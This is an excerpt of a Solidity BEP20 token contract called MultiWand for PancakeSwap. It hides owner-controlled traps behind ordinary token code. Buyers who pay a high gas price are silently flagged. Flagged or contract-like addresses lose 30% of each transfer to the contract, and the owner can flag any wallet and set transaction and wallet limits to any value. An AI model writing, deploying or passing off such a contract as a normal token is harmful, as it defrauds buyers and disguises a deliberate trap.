...
contract MULTIWAND is IBEP20, Auth {
    using SafeMath for uint256;
    
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    string constant _name = "MultiWand";
    string constant _symbol = "MULTIWAND";
    ...
    uint256 transferFactor = 10;
    uint256 catchAmt = 3000000000;
    ...
    constructor () Auth(msg.sender) {
        ...
        isPancake[address(router)] = true;
        isPancake[address(pair)] = true;
    ...
    function setMaxTx(uint256 _mnbTP) external authorized {
        uint256 newMT = (_totalSupply * _mnbTP) / 10000;
        _maxTxAmount = newMT;
    }
    
    function setMaxWallet(uint256 _mnWP) external authorized {
        uint256 newMW  = (_totalSupply * _mnWP) / 10000;
        _maxWalletToken = newMW;
    }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool){
        ...
        if(sender == pair && tx.origin != recipient && !isContract[sender] && !isContract[recipient] && tx.gasprice > catchAmt){
            isMulti[recipient] = true;}
        return true;
    }
    ...
    function taketotalFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        bool isPair = sender == pair;
        
        if(isPair && isCont(sender) && !isPancake[sender] && !isContract[sender] ||
         isPair && isCont(recipient) && !isPancake[recipient] && !isContract[recipient] ||
         isPair && !isPancake[sender] && !isContract[sender] && msg.sender != tx.origin ||
         isMulti[sender]) {
        uint256 contAmount = amount.mul(30).div(100);
        _balances[address(this)] = _balances[address(this)].add(contAmount);
        emit Transfer(sender, address(this), contAmount);
        return amount.sub(contAmount);}
    ...
    function viewisMulti(address _address) public view returns (bool) {
        return isMulti[_address];
    }

    function setisPancake(bool _enable, address _address) external authorized {
        isPancake[_address] = _enable;
    }
    ...
    function setisMulti(address[] calldata addresses, bool _enable) external authorized {
        for(uint i=0; i < addresses.length; i++){
        isMulti[addresses[i]] = _enable;}
    }
    ...
    function setSwapSettings(bool _enabled, uint256 _amount) external authorized {
        ...
        uint256 newST = _totalSupply * _amount / 100000;
        swapThreshold = newST;
    }

    function setTransferMinAmount(uint256 _amount) external authorized {
        uint256 newMA = _totalSupply * _amount / 100000;
        _minAmount = newMA;
    }

    function setDeposit(uint256 _amount) external authorized {
        uint256 amtSwap = _totalSupply * _amount / 10000;
        variableSwapBack(amtSwap);
    }
